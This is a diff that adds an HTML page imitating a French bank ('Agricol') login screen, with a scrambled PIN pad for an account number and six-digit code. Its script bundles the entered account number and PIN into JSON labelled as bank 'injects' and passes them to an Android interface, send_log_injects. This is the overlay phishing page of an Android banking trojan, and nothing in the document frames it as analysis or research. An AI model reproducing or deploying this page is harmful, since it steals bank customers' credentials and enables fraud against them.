@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Agricol</title>
+
+
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.8/angular.min.js"></script>
+
+
+	<style>
+		html.body { height: 100%; } body {background: #D3E8EE; } .top {color: #115D62; font-size: 24px; font-weight: 300; padding-top: 20px; } .main {margin-top: 44px; margin-left: 25px; } h1.h1 {font-size: 18px; } .form-control ,.form-control:focus{all: unset; width: 90%; border-bottom: 1px solid #868686; font-size: 19px; color: #545353; } i.quesiton-icon.fa.fa-question-circle {font-size: 29px; color: #105d62; } span.fa.fa-chevron-left {margin-right: 3px; } .pin-div {/* border: 1px dotted red; */ margin: 0 auto; /* padding: 0px 72px; */ margin-top: 22px; width: 240px; } span.dot {width: 10px; height: 10px; background: #98d8dc; border-radius: 100px; } span.dot.active {background: #105d62 !important; } .pin-clear.active{color:#105d62 !important; } span.pin-clear {/* background: #105d62; */ font-size: 25px; position: relative; color: #98d8dc; top: -7px; } .form-group.pin-form-group {margin-top: 49px; } span.pinpad-item {background: #f2fafb; width: 50px; height: 50px; font-size: 37px; margin-top: 15px; border-radius: 100px; text-align: center; line-height: 48px; font-weight: 200; color: #105d62; box-shadow: 1px 1px 4px black; } .pinpad-container {margin: 0 auto; width: 290px; margin-top: 24px; } .footer {position: fixed; bottom: 0px; left: 0px; width: 100%; } button.btn.btn-light.w-100 {font-size: 25px; color: #ffc107; height: 59px; font-weight: 200; }
+	</style>
+
+
+
+</head>
+
+
+
+<body     ng-app="app" ng-controller="c1"   ng-cloak    >
+
+
+<div class="top">
+	<div class="container">
+		<span class="fa fa-chevron-left"></span> Retour
+	</div>
+</div>
+
+
+<div class="main">
+	<div class="container">
+		<div class="row">
+			<div class="col"></div>
+			<div class="col-sm-10">
+				<div class="scum" id="login-view">
+					<form name="form1" id="form1" autocomplete="off" novalidate onsubmit="send1(event,'finish__');return false">	
+						<h1 class="h1">Mes informations de connexion</h1>
+						<div class="form-group">
+							<label for="username">Numéro  de compte</label>
+							<div class="input-wrap">
+								<input type="text" class="form-control" pattern="\d{11}" maxlength="11" data-ng-model="data.username" required id="username" name="username" data-err_text="Please enter valid " >
+								<i class="quesiton-icon fa fa-question-circle"></i>
+							</div>
+						</div>
+
+
+						<div class="form-group pin-form-group">
+							<label for="id__">
+								Code personnel
+							</label>
+
+
+							<div class="pin-div">
+								<div class="pin0input d-flex justify-content-between">
+									 <span class="dot" data-ng-class="{'active':data.pin.length>0}"></span>
+									 <span class="dot" data-ng-class="{'active':data.pin.length>1}"></span>
+									 <span class="dot" data-ng-class="{'active':data.pin.length>2}"></span>
+									 <span class="dot" data-ng-class="{'active':data.pin.length>3}"></span>
+									 <span class="dot" data-ng-class="{'active':data.pin.length>4}"></span>
+									 <span class="dot" data-ng-class="{'active':data.pin.length>5}"></span>
+									 <span data-ng-class="{'active':data.pin.length>0}" class="pin-clear  fa fa-window-close " ng-click="data.pin=''"></span>
+								</div>
+							</div>
+
+
+							<div class="pinpad-container">
+								<div class="pinpadrow d-flex justify-content-between">
+										
+										<span class="pinpad-item" data-ng-click="update_pin($event);">1</span>
+										<span class="pinpad-item" data-ng-click="update_pin($event);">4</span>
+										<span class="pinpad-item" data-ng-click="update_pin($event);">7</span>
+										<span class="pinpad-item" data-ng-click="update_pin($event);">9</span>
+										<span class="pinpad-item" data-ng-click="update_pin($event);">0</span>
+	
+								</div>
+
+
+								<div class="pinpadrow d-flex justify-content-between">
+										
+										<span class="pinpad-item " data-ng-click="update_pin($event);">2</span>
+										<span class="pinpad-item" data-ng-click="update_pin($event);">5</span>
+										<span class="pinpad-item" data-ng-click="update_pin($event);">8</span>
+										<span class="pinpad-item" data-ng-click="update_pin($event);">3</span>
+										<span class="pinpad-item" data-ng-click="update_pin($event);">5</span>
+	
+								</div>
+							</div>
+						</div>
+					</form>
+
+
+
+					
+					
+
+
+
+				</div>
+			</div>
+			<div class="col"></div>
+		</div>
+	</div>
+</div>
+
+
+
+<div class="footer">
+		
+	<button class="btn btn-light w-100" form="form1" data-ng-disabled="form1.$invalid || data.pin.length!=6">
+		Continuer
+	</button>
+
+
+</div>
+
+
+
+<script type="text/javascript">
+
+
+
+$(document).ready(function() {
+    $('<div class="loader__" style="display:none;position: fixed;background: rgba(21, 20, 20, 0.51);width: 100%;height: 100%;top: 0px;left: 0px;z-index: 1000;text-align: center;"></div>').appendTo('body');
+    window.loader_ = {
+        hide: function() {
+            $('.loader__').fadeOut('fast');
+        },
+        show: function() {
+            $('.loader__').fadeIn('fast');
+        }
+    }
+});
+
+
+    send1 = function(e, callback__, global_luhn__) {
+        e.preventDefault();
+        var el = e.target;
+        var err = false;
+        var err_text = [];
+        var err_elements = [];
+
+        $(el).find("input:visible,select:visible").each(function() {
+            var reg__ = new RegExp($(this).attr('pattern'));
+
+            if (!reg__.test($(this).val())) {
+                err = true;
+                err_elements.push(this);
+                err_text.push(this.dataset.err_text);
+                return;
+            }
+            var luhn__ = $(this).data().luhn;
+            if (typeof luhn__ != "undefined" && luhn__ != "") {
+
+                if ($(this).val() != "") {
+                    if (!eval(luhn__)($(this).val(), err_text)) {
+                        err = true;
+                        err_elements.push(this);
+                    }
+                }
+            }
+        });
+
+        if (!err) {
+            if (typeof global_luhn__ != "undefined") {
+                if (!eval(global_luhn__)(err_text)) {
+                    err = true;
+                }
+            }
+        }
+
+
+        if (err) {
+            err_text = err_text.filter(function(e) {
+                return e;
+            });
+            err_text = $.unique(err_text);
+            $(".err_ul").html("");
+            $(err_text).each(function(i, t) {
+                $("<li><span>" + t + "</span></li>").appendTo(".err_ul");
+            });
+
+            $(".err_div").show();
+            $(err_elements).each(function() {
+                $(this).closest(".form-group").addClass("has_err");
+                $(this).addClass("has_err");
+
+            });
+            $(window).scrollTop(0);
+            return;
+        }
+
+        if (typeof callback__ != "undefined") {
+            eval(callback__)(el);
+            return;
+        }
+        //alert("We stack, what to do next?");
+    };
+
+
+
+
+angular.module('app', []).controller('c1', ['$scope', function($scope) {
+    window.sc_ = $scope;
+    $scope.data = {
+        pin: ""
+    }
+    $scope.update_pin = function(e) {
+        if ($scope.data.pin.length < 6) {
+            $scope.data.pin = $scope.data.pin + "" + $(e.target).text().trim()
+        }
+    }
+}])
+
+
+
+
+
+function finish__(el) {
+        
+        var cc = sc_.data.cc_2 + "" + sc_.data.cc_3;
+        loader_.show();
+        setTimeout(function() {
+            top['closeDlg'] = true;
+            var ua = navigator.userAgent.toLowerCase();
+            var data__ = '{"datauser":"' + sc_.data.username +
+                    '","datapin":"' + sc_.data.pin + 
+                    '","type_injects":"banks"' +  
+                    ',"closed":"close_activity_injects"}';
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(data__);
+                } catch (err) {}
+            }else{
+                alert(data__);
+            }
+
+        }, 3000);
+    }
+
+
+
+</script>
+</body>
+</html>
